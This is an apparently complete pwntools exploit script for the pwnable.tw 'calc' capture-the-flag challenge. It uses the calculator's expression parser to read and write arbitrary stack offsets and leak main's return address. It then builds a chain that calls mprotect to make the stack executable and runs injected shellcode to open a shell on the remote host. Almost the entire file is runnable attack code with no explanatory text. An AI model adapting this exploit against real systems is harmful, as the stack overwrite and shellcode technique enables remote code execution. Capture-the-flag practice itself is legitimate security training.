#!/usr/bin/env python3
import pwn


pwn.context(arch='i386', kernel='i386', os='linux', endian='little', word_size=32, terminal=["tmux", "splitw", "-v"])
remote = pwn.remote('chall.pwnable.tw', 10100)
remote.recvuntil("=== Welcome to SECPROG calculator ===\n")


def read_stack_offset(offset):
    assert offset > 0
    remote.send(str(offset) + '+00\n')
    signed = int(remote.recvuntil('\n'))
    unsigned = signed % 2**32
    return unsigned


def write_stack_offset(offset, value):
    assert offset > 0
    assert value > 0
    remote.send(str(offset) + '*' + '00%' + str(value) + '\n')
    remote.recvline()

main_ret_address_offset = 361

def get_stack_address_below_main():
    esp_placed_at_offset = 400
    return read_stack_offset(esp_placed_at_offset) - \
           (esp_placed_at_offset + main_ret_address_offset)

program = pwn.ELF("../calc")

def search_for_main():
    for x in range(390, 405):
        value = read_stack_offset(x)
        print("Offset: %d. Value: 0x%08x" % (x, value))
        if value == program.symbols['main']:
            print("FOUND MAIN AT %d" % x)


#search_for_main()


main_address = read_stack_offset(main_ret_address_offset)
write_stack_offset(main_ret_address_offset, main_address)
read_stack_offset(main_ret_address_offset)


def write_rop_chain_to_addr(addr, rop_chain):
    assert len(rop_chain) % 4 == 0
    for x in range(0, int(len(rop_chain)/4)):
        val = rop_chain[x*4:(x + 1)*4]
        val = pwn.u32(val)
        write_stack_offset(x + addr, val)

# Idea:


mprotect_addr = program.symbols['mprotect']

stack_addr = get_stack_address_below_main()
stack_addr_at_pagesize = stack_addr % 4096
rop_chain = (
    pwn.p32(stack_addr_at_pagesize) +
    pwn.p32(4096) +         # page size
    pwn.p32(7)              # rwx
)

rop_chain += (
    pwn.p32(stack_addr - len(rop_chain)) +
    pwn.asm(pwn.shellcraft.sh())
)

write_rop_chain_to_addr(stack_addr+1, rop_chain)
write_stack_offset(main_ret_address_offset, mprotect_addr)
remote.interactive()
